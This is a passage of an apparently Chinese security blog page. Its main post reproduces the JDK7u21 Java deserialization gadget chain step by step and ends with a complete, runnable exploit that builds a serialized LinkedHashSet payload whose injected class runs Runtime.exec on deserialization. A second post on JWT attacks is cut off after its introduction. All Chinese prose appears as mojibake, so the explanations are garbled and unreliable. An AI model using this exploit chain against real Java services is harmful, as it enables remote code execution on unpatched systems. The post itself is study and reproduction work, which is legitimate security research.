<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="https://www.ccreater.top/page/6/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-jdk7u21ååºåˆ—åŒ–å¤ç°" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">jdk7u21ååºåˆ—åŒ–å¤ç°</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="JDK7u21ååºåˆ—åŒ–é“¾å¤ç°"><a href="#JDK7u21ååºåˆ—åŒ–é“¾å¤ç°" class="headerlink" title="JDK7u21ååºåˆ—åŒ–é“¾å¤ç°"></a>JDK7u21ååºåˆ—åŒ–é“¾å¤ç°</h1><p>exp:</p>
<pre><code class="java">public class jdk7u21 {
    public static void main(String[] args) throws Exception {

            TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(&quot;calc&quot;);//ç”Ÿæˆæ¶æ„çš„calc
            calc.getOutputProperties();//è°ƒç”¨getOutputPropertieså°±å¯ä»¥æ‰§è¡Œcalc
    }
}</code></pre>
<p>ä¸€æ­¥æ­¥è°ƒè¯•å‘ç°åœ¨<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>å¼¹å‡ºcalc<br><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201004163506.png" alt="image466"><br>ç¬¬380è¡Œæ˜¯è§¦å‘å‘½ä»¤æ‰§è¡Œçš„ç‚¹</p>
<h2 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h2><pre><code class="java">public class instance {
    static{
        try {
            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static void main(String args[]){
        try {
            instance.class.newInstance();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

    }
}

</code></pre>
<p>å°†æ¶æ„ä»£ç æ”¾åœ¨staticæˆ–æ„é€ æ–¹æ³•ä¸­ä¾¿å¯ä»¥åœ¨åˆå§‹åŒ–æ—¶æ‰§è¡Œæ¶æ„ä»£ç </p>
<h2 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance"></a>getTransletInstance</h2><p>é€å¥æ‰§è¡Œè§‚å¯Ÿåˆ°å‘½ä»¤æ‰§è¡Œçš„é™åˆ¶æ¡ä»¶ä¸getOutputPropertieså’ŒnewTransformeræ²¡æœ‰å¤ªå¤§å…³ç³»<br>åœ¨getTransletInstanceä¸­å‘ç°ä¸€ç³»åˆ—çš„é™åˆ¶</p>
<pre><code class="java">private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;//TemplatesImpl._name!=null

            if (_class == null) defineTransletClasses();//TemplatesImpl._class==null

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//_transletIndexåœ¨defineTransletClassesä¸­å®šä¹‰
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }</code></pre>
<p>TemplatesImpl._name!=nullå’ŒTemplatesImpl._class==nullæ˜¯æ‰§è¡Œåˆ°newInstanceå¤„çš„å¿…è¦æ¡ä»¶<br>è€Œ_transletIndexä¹Ÿæ˜¯åœ¨defineTransletClassesä¸­å®šä¹‰<br>è·Ÿè¿›defineTransletClassesæŸ¥æ‰¾è¿›ä¸€æ­¥çš„é™åˆ¶æ¡ä»¶</p>
<h2 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses"></a>defineTransletClasses</h2><pre><code class="java">private void defineTransletClasses()
        throws TransformerConfigurationException {

        if (_bytecodes == null) {//_bytecodes!=null
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader());
                }
            });

        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount &gt; 1) {
                _auxClasses = new Hashtable();
            }

            for (int i = 0; i &lt; classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }//_class.superClass==com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }

            ...
        }
        ...
    }</code></pre>
<p>é˜…è¯»ä»£ç å‘ç°<code>_class[i] = loader.defineClass(_bytecodes[i]);</code>åŠ è½½äº†æˆ‘ä»¬çš„æ¶æ„ç±»ï¼Œä½†æ˜¯å®ƒå¿…é¡»æ˜¯<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>çš„å­ç±»<br>_bytecodes!=null<br>ç»¼ä¸Šæˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¦æ‰§è¡Œåˆ°æ¶æ„ä»£ç çš„è§¦å‘ç‚¹éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</p>
<pre><code>1. TemplatesImpl._name!=null
2. TemplatesImpl._class==null
3. _bytecodes!=null
4. æ¶æ„ç±»æ˜¯`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`çš„å­ç±»
5. TemplatesImplç±»ä¸­çš„_tfactoryå˜é‡éœ€è¦æœ‰ä¸€ä¸ªgetExternalExtensionsMapæ–¹æ³•ï¼ˆå…¶ä»–ç‰ˆæœ¬çš„é™åˆ¶æ¡ä»¶ï¼‰</code></pre><p>å…³äºç¬¬äº”ç‚¹çš„ç›¸å…³ä»£ç æ˜¯(ä¸7u21ç•¥æœ‰ä¸åŒ)ï¼š</p>
<pre><code class="java">TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new 
        //é™åˆ¶æ¡ä»¶4ï¼šTemplatesImplç±»ä¸­çš„_tfactoryå˜é‡éœ€è¦æœ‰ä¸€ä¸ªgetExternalExtensionsMapæ–¹æ³•
        //           å³éœ€è¦æ˜¯ä¸€ä¸ªTransformerFactoryImplç±»
   TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });</code></pre>
<h2 id="å°è¯•è‡ªå·±å†™ä¸€ä¸ªPOC"><a href="#å°è¯•è‡ªå·±å†™ä¸€ä¸ªPOC" class="headerlink" title="å°è¯•è‡ªå·±å†™ä¸€ä¸ªPOC"></a>å°è¯•è‡ªå·±å†™ä¸€ä¸ªPOC</h2><h3 id="Gadgets-createTemplatesImpl"><a href="#Gadgets-createTemplatesImpl" class="headerlink" title="Gadgets.createTemplatesImpl"></a>Gadgets.createTemplatesImpl</h3><p>è·Ÿè¿›</p>
<pre><code class="java">public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
        final TemplatesImpl templates = new TemplatesImpl();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        clazz.makeClassInitializer()
                .insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;
                        + command.replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;)
                        + &quot;\&quot;);&quot;);
        // unique name to allow repeated execution (watch out for PermGen exhaustion)
        clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());//Sets the class name

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {
                classBytes,
                ClassFiles.classAsBytes(Foo.class)});
//                  classBytes});
        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);
//        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
        return templates;
    }</code></pre>
<p>å…¶ä¸­clazzæ˜¯æˆ‘ä»¬çš„æ¶æ„ç±»è£…åœ¨templatesçš„_bytecodesä¸­ï¼Œtemplatesæ»¡è¶³äº†å…¶ä»–çš„é™åˆ¶æ¡ä»¶<br>è¿™é‡Œç”¨äº†javassistæ¥æ„é€ æˆ‘ä»¬çš„æ¶æ„ç±»</p>
<h3 id="javassistç®€ä»‹"><a href="#javassistç®€ä»‹" class="headerlink" title="javassistç®€ä»‹"></a>javassistç®€ä»‹</h3><p><a href="https://www.cnblogs.com/rickiyang/p/11336268.html" target="_blank" rel="noopener">https://www.cnblogs.com/rickiyang/p/11336268.html</a></p>
<pre><code class="java">
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
    clazz.makeClassInitializer()//Makes an empty class initializer (static constructor).
                    .insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;
                            + command.replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;)
                            + &quot;\&quot;);&quot;);//åœ¨æ–¹æ³•åé¢æ·»åŠ ä»£ç 
    clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());</code></pre>
<h3 id="è‡ªå·±å®ç°"><a href="#è‡ªå·±å®ç°" class="headerlink" title="è‡ªå·±å®ç°"></a>è‡ªå·±å®ç°</h3><pre><code class="java">public class myjdk7u21 {
    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }

    }
    public static void main(String args[]) throws NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(evil.class));
        CtClass evilobj = pool.get(evil.class.getName());
        evilobj.makeClassInitializer().insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
        evilobj.setName(&quot;ccreater233&quot;+System.nanoTime());

        final TemplatesImpl tpl = new TemplatesImpl();
        setField(TemplatesImpl.class,tpl,&quot;_name&quot;,&quot;ccreater&quot;);
        setField(TemplatesImpl.class,tpl,&quot;_class&quot;,null);
        setField(TemplatesImpl.class,tpl,&quot;_bytecodes&quot;,new byte[][]{evilobj.toBytecode()});
        tpl.getOutputProperties();

    }
    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(key);
        field.setAccessible(true);
        field.set(obj,value);
    }
}
</code></pre>
<p>é‡åˆ°çš„å‘ï¼ševilè®°å¾—å£°æ˜ä¸ºpublicï¼Œä¸ç„¶é»˜è®¤æ˜¯private,å°±æ— æ³•newInstanceäº†</p>
<h2 id="åŠ¨æ€ä»£ç†AnnotationInvocationHandler"><a href="#åŠ¨æ€ä»£ç†AnnotationInvocationHandler" class="headerlink" title="åŠ¨æ€ä»£ç†AnnotationInvocationHandler"></a>åŠ¨æ€ä»£ç†AnnotationInvocationHandler</h2><p>åˆ©ç”¨åŠ¨æ€ä»£ç†æ¥æ¥è¿‘ååºåˆ—åŒ–åç›´æ¥RCEçš„ç›®çš„</p>
<pre><code class="java">        final Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,new HashMap());

        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);
        proxy.equals(tpl);</code></pre>
<p>æˆ‘ä»¬çœ‹ä¸‹AnnotationInvocationHandlerçš„æ„é€ æ–¹æ³•</p>
<pre><code class="java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {
        this.type = var1;
        this.memberValues = var2;
    }</code></pre>
<p>typeå’ŒmemberValuesçš†å¯æ§</p>
<p>debugè·Ÿè¿›<br>proxy.equals è°ƒç”¨äº†åŠ¨æ€ä»£ç†AnnotationInvocationHandlerçš„invokeæ–¹æ³•</p>
<pre><code class="java">    public Object invoke(Object var1, Method var2, Object[] var3) {
            String var4 = var2.getName();
            Class[] var5 = var2.getParameterTypes();
            if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) {
                return this.equalsImpl(var3[0]);
            }
            ...
    }</code></pre>
<p>æ–¹æ³•åä¸ºequalsä¸”åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¿™è¿›å…¥<code>this.equalsImpl(var3[0]);</code></p>
<p>equalsImpl</p>
<pre><code class="java">private Boolean equalsImpl(Object var1) {
        if (var1 == this) {
            return true;
        } else if (!this.type.isInstance(var1)) {
            return false;
        } else {
            Method[] var2 = this.getMemberMethods();
            int var3 = var2.length;

            for(int var4 = 0; var4 &lt; var3; ++var4) {
                Method var5 = var2[var4];
                String var6 = var5.getName();
                Object var7 = this.memberValues.get(var6);
                Object var8 = null;
                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
                if (var9 != null) {
                    var8 = var9.memberValues.get(var6);
                } else {
                    try {
                        var8 = var5.invoke(var1);
                    } catch (InvocationTargetException var11) {
                        return false;
                    } catch (IllegalAccessException var12) {
                        throw new AssertionError(var12);
                    }
                }...
            }
        }
    }</code></pre>
<p>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­è°ƒç”¨äº†<code>var8 = var5.invoke(var1);</code>,ç›¸å½“äºvar1.var5(),å…¶ä¸­var1æ˜¯a.equals(b)ä¸­çš„b<br>var5æ˜¯this.typeçš„ç¬¬ä¸€ä¸ªæ–¹æ³•(this.getMemberMethods()[0])<br>è·Ÿè¿›getMemberMethods</p>
<pre><code class="java">private Method[] getMemberMethods() {
        if (this.memberMethods == null) {
            this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() {
                public Method[] run() {
                    Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                    AccessibleObject.setAccessible(var1, true);
                    return var1;
                }
            });
        }

        return this.memberMethods;
    }</code></pre>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶this.typeä»è€Œè°ƒç”¨xx.equals(evilObj),æ¥è¾¾åˆ°evilObj.AnyMethod()çš„æ•ˆæœ<br>è¿™ä¹Ÿæ°å¥½ç¬¦åˆäº†æˆ‘ä»¬æƒ³è°ƒç”¨evilObj.getOutputProperties()æƒ…å†µ<br>æœ€åé€‰æ‹©äº†Templates,å®ƒçš„ç¬¬ä¸€ä¸ªæ–¹æ³•æ˜¯newTransformer,æ¼æ´ç‚¹åœ¨newTransformerä¸­è§¦å‘</p>
<h2 id="LinkedHashSetååºåˆ—åŒ–è°ƒç”¨equals"><a href="#LinkedHashSetååºåˆ—åŒ–è°ƒç”¨equals" class="headerlink" title="LinkedHashSetååºåˆ—åŒ–è°ƒç”¨equals"></a>LinkedHashSetååºåˆ—åŒ–è°ƒç”¨equals</h2><p>é—®æˆ‘ä¸ºå•¥çŸ¥é“è¿™é‡Œå¯ä»¥ï¼Œç­”ï¼šåˆ«äººå‘ç°çš„<br>LinkedHashSetæ²¡æœ‰å®ç°readObjectæ–¹æ³•è€Œæ˜¯è°ƒç”¨äº†HashSetçš„readObjectæ–¹æ³•ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œä¸ºå•¥ä¸ç›´æ¥è°ƒç”¨HashSetå˜<br>ç­‰ä¸‹å°±çŸ¥é“äº†<br>HashSet::readObject</p>
<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in any hidden serialization magic
        s.defaultReadObject();

        // Read in HashMap capacity and load factor and create backing HashMap
        int capacity = s.readInt();
        float loadFactor = s.readFloat();
        map = (((HashSet)this) instanceof LinkedHashSet ?
               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :
               new HashMap&lt;E,Object&gt;(capacity, loadFactor));

        // Read in size
        int size = s.readInt();

        // Read in all elements in the proper order.
        for (int i=0; i&lt;size; i++) {
            E e = (E) s.readObject();
            map.put(e, PRESENT);
        }
    }</code></pre>
<p>è·Ÿè¿›HashMap::putæ–¹æ³•</p>
<pre><code class="java">public V put(K key, V value) {
        if (key == null)
            return putForNullKey(value);
        int hash = hash(key);
        int i = indexFor(hash, table.length);
        for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
            Object k;
            if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
                V oldValue = e.value;
                e.value = value;
                e.recordAccess(this);
                return oldValue;
            }
        }

        modCount++;
        addEntry(hash, key, value, i);
        return null;
    }</code></pre>
<p>æˆ‘ä»¬çœ‹åˆ°key.equals(k)å®Œç¾çš„ç¬¦åˆäº†æˆ‘ä»¬çš„é¢„æœŸ<br>è¿™é‡Œå¾—æ˜¯é¡ºåºè°ƒç”¨æ‰èƒ½å¸¸å‡ºç°proxy.equals(evilObj),æ‰€ä»¥ç”¨äº†LinkedHashSet<br>ä½†æ˜¯åœ¨è¿™ä¹‹å‰æˆ‘ä»¬è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶</p>
<ol>
<li>e.hash == hashå³hash(proxy) == hash(evilObj)</li>
<li>e.key!=keyå³proxy!=evilObj<br>ç¬¬äºŒä¸ªæ¡ä»¶å¾ˆå®¹æ˜“æ»¡è¶³ï¼Œç¬¬ä¸€ä¸ªæ¡ä»¶å°±GGäº†<br>è·Ÿè¿›int hash = hash(key);ä¸­çš„hashæ–¹æ³•çœ‹ä¸€ä¸‹å‘ç°</li>
</ol>
<pre><code class="java">final int hash(Object k) {
        int h = 0;
        if (useAltHashing) {
            if (k instanceof String) {
                return sun.misc.Hashing.stringHash32((String) k);
            }
            h = hashSeed;
        }

        h ^= k.hashCode();

        // This function ensures that hashCodes that differ only by
        // constant multiples at each bit position have a bounded
        // number of collisions (approximately 8 at default load factor).
        h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
        return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
    }</code></pre>
<p>è°ƒç”¨äº†keyçš„hashCodeæ–¹æ³•ï¼Œå³è¿›å…¥äº†AnnotationInvocationHandlerçš„invokeæ–¹æ³•<br>è§è¯å¥‡è¿¹çš„æ—¶åˆ»ï¼š<br>åœ¨invokeä¸­æœ‰è¿™æ ·çš„ä¸€å¥è¯ï¼š</p>
<pre><code>if (var4.equals(&quot;hashCode&quot;)) {
    return this.hashCodeImpl();</code></pre><p>è·Ÿè¿›hashCodeImpl</p>
<pre><code class="java">    private int hashCodeImpl() {
        int var1 = 0;

        Entry var3;
        for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
            var3 = (Entry)var2.next();
        }

        return var1;
    }</code></pre>
<p>æˆ‘ä»¬å…³æ³¨<code>var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</code><br>è¿™ç›¸å½“äº<code>127*key.hashcode()^Arrays.hashCode((Object[])((Object[])value))</code><br>å› ä¸º0^x=x,ä¸”<em>ä¼˜å…ˆçº§å¤§äº^,æ‰€ä»¥ä»¤key.hashcode()=0ä½¿å¾—e.hash == hashæœ€ç»ˆå˜æˆ<br>127</em>key.hashcode()^Arrays.hashCode((Object[])((Object[])value))=0^value.hashcode()==value.hashcode()<br>æ‰€ä»¥æ„é€ </p>
<pre><code class="java">package org.example;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;


public class myjdk7u21 {

    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }

    }

    public static void main(String args[]) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(evil.class));
        CtClass evilobj = pool.get(evil.class.getName());
        evilobj.makeClassInitializer().insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
        evilobj.setName(&quot;ccreater233&quot;+System.nanoTime());

        final TemplatesImpl tpl = new TemplatesImpl();
        setField(TemplatesImpl.class,tpl,&quot;_name&quot;,&quot;ccreater&quot;);
        setField(TemplatesImpl.class,tpl,&quot;_class&quot;,null);
        setField(TemplatesImpl.class,tpl,&quot;_bytecodes&quot;,new byte[][]{evilobj.toBytecode()});
        //evil instance

        //tpl.getOutputProperties();
        final Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        HashMap map = new HashMap();
        map.put(&quot;f5a5a608&quot;,&quot;23333&quot;);
        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);

        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);

        HashSet a = new LinkedHashSet();
        a.add(tpl);
        a.add(proxy);
        map.put(&quot;f5a5a608&quot;,tpl);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        //åºåˆ—åŒ–
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(a);//åºåˆ—åŒ–å¯¹è±¡
        objectOutputStream.flush();
        objectOutputStream.close();
        //ååºåˆ—åŒ–
        byte[] bytes = byteArrayOutputStream.toByteArray(); //è¯»å–åºåˆ—åŒ–åçš„å¯¹è±¡byteæ•°ç»„
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//å­˜æ”¾byteæ•°ç»„çš„è¾“å…¥æµ
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        Object o = objectInputStream.readObject();

    }
    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(key);
        field.setAccessible(true);
        field.set(obj,value);
    }
}
</code></pre>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/jdk7u21ååºåˆ—åŒ–å¤ç°/">https://www.ccreater.top/1970/01/01/jdk7u21ååºåˆ—åŒ–å¤ç°/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" data-id="ckmn57575005ws1nicp0z07hm" data-title="jdk7u21ååºåˆ—åŒ–å¤ç°" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-jwtæ”»å‡»æ–¹å¼" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">jwtæ”»å‡»æ–¹å¼</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h1><h2 id="æ–‡ç« "><a href="#æ–‡ç« " class="headerlink" title="æ–‡ç« "></a>æ–‡ç« </h2><p> <a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p>
<p>  <a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a> </p>
<h2 id="å…³äºjwt"><a href="#å…³äºjwt" class="headerlink" title="å…³äºjwt"></a>å…³äºjwt</h2><p>JWTçš„å…¨ç§°æ˜¯Json Web Tokenã€‚å®ƒéµå¾ªJSONæ ¼å¼ï¼Œå°†ç”¨æˆ·ä¿¡æ¯åŠ å¯†åˆ°tokené‡Œï¼ŒæœåŠ¡å™¨ä¸ä¿å­˜ä»»ä½•ç”¨æˆ·ä¿¡æ¯ï¼Œåªä¿å­˜å¯†é’¥ä¿¡æ¯ï¼Œé€šè¿‡ä½¿ç”¨ç‰¹å®šåŠ å¯†ç®—æ³•éªŒè¯tokenï¼Œé€šè¿‡tokenéªŒè¯ç”¨æˆ·èº«ä»½ã€‚åŸºäºtokençš„èº«ä»½éªŒè¯å¯ä»¥æ›¿ä»£ä¼ ç»Ÿçš„cookie+sessionèº«ä»½éªŒè¯æ–¹æ³•ã€‚</p>
<p>jwtç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š<code>header</code>.<code>payload</code>.<code>signature</code></p>
